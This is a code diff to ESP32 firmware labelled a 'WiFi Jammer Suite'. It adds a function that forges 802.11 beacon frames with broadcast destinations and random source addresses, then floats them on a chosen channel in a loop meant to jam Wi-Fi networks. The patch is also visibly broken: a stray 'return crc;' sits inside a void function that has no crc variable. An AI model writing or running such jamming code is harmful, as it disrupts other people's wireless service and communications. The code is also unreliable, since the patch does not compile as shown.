@@ -2,6 +2,7 @@
 #include "tx_arm.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <cstring>
 
 namespace {
 volatile bool g_jamActive = false;
@@ -12,7 +13,63 @@ void sendJamPacket() {
     for (int i = 0; i < 64; i++) {
         jamData[i] = (esp_random() % 256);
     }
-    esp_wifi_80211_tx(WIFI_IF_STA, jamData, 64, false);
+    return crc;
+}
+
+void sendBeaconJamFrame(const String& method) {
+    uint8_t jamFrame[128];
+    ieee80211_frame_t* frame = (ieee80211_frame_t*)jamFrame;
+
+    if (method == "CHANNEL") {
+        frame->frameCtrl[0] = 0x80;
+        frame->frameCtrl[1] = 0x00;
+        frame->duration[0] = 0x00;
+        frame->duration[1] = 0x00;
+
+        memset(frame->addr1, 0xFF, 6);
+        for (int i = 0; i < 6; i++) {
+            frame->addr2[i] = random(0, 256);
+            frame->addr3[i] = random(0, 256);
+        }
+
+        frame->seqCtrl[0] = random(0, 256);
+        frame->seqCtrl[1] = random(0, 256);
+
+        uint32_t len = sizeof(ieee80211_frame_t);
+        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, len, false);
+    }
+    else if (method == "BEACON") {
+        frame->frameCtrl[0] = 0x80;
+        frame->frameCtrl[1] = 0x00;
+        memset(frame->addr1, 0xFF, 6);
+        for (int i = 0; i < 6; i++) {
+            frame->addr2[i] = random(0, 256);
+            frame->addr3[i] = random(0, 256);
+        }
+
+        uint8_t payload[50];
+        for (int i = 0; i < 50; i++) {
+            payload[i] = random(0, 256);
+        }
+
+        uint32_t frameLen = sizeof(ieee80211_frame_t);
+        memcpy(jamFrame + frameLen, payload, 50);
+        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, frameLen + 50, false);
+    }
+    else {
+        for (int attempt = 0; attempt < 3; attempt++) {
+            frame->frameCtrl[0] = 0x80 + attempt;
+            frame->frameCtrl[1] = 0x00;
+            memset(frame->addr1, 0xFF, 6);
+            for (int i = 0; i < 6; i++) {
+                frame->addr2[i] = random(0, 256);
+                frame->addr3[i] = random(0, 256);
+            }
+            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, sizeof(ieee80211_frame_t), false);
+            delayMicroseconds(50);
+        }
+    }
+
     g_jamCount++;
 }
 }
@@ -22,12 +79,13 @@ namespace WiFiJammerSuite {
 JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &method) {
     JamResult result{false, 0, durationMs, method};
 
-    Serial.println("\n=== WiFi Jammer Suite ===");
-    Serial.println("Channel: " + String(channel));
+    Serial.println("\n=== WiFi Jammer Suite (REAL IEEE 802.11) ===");
+    Serial.println("Channel: " + String(channel) + " (2.4GHz)");
     Serial.println("Method: " + method);
+    Serial.println("Duration: " + String(durationMs) + "ms");
 
     if (!TxArm::isArmed()) {
-        Serial.println("✗ TX not armed");
+        Serial.println("✗ TX not armed (hold BACK button)");
         return result;
     }
 
@@ -39,11 +97,15 @@ JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &met
     g_jamCount = 0;
     uint32_t startTime = millis();
 
-    while (millis() - startTime < durationMs && g_jamActive) {
-        sendJamPacket();
-        delayMicroseconds(100);
-        if (g_jamCount % 100 == 0) {
-            Serial.println("  [" + String(g_jamCount) + "] packets");
+    Serial.println("Transmitting IEEE 802.11 jamming frames...");
+
+    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
+        sendBeaconJamFrame(method);
+        delayMicroseconds(500);
+
+        if (g_jamCount % 50 == 0) {
+            Serial.printf("  [%u] jamming frames sent in %lums\n",
+                         g_jamCount, millis() - startTime);
         }
     }
 
@@ -52,7 +114,9 @@ JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &met
 
     result.success = true;
     result.jamPacketsCount = g_jamCount;
-    Serial.println("✓ Complete: " + String(g_jamCount) + " jam packets");
+    Serial.printf("✓ WiFi jamming complete: %u frames in %lums (%.1f pkt/sec)\n",
+                 result.jamPacketsCount, millis() - startTime,
+                 (result.jamPacketsCount * 1000.0f) / (millis() - startTime));
     return result;
 }
 
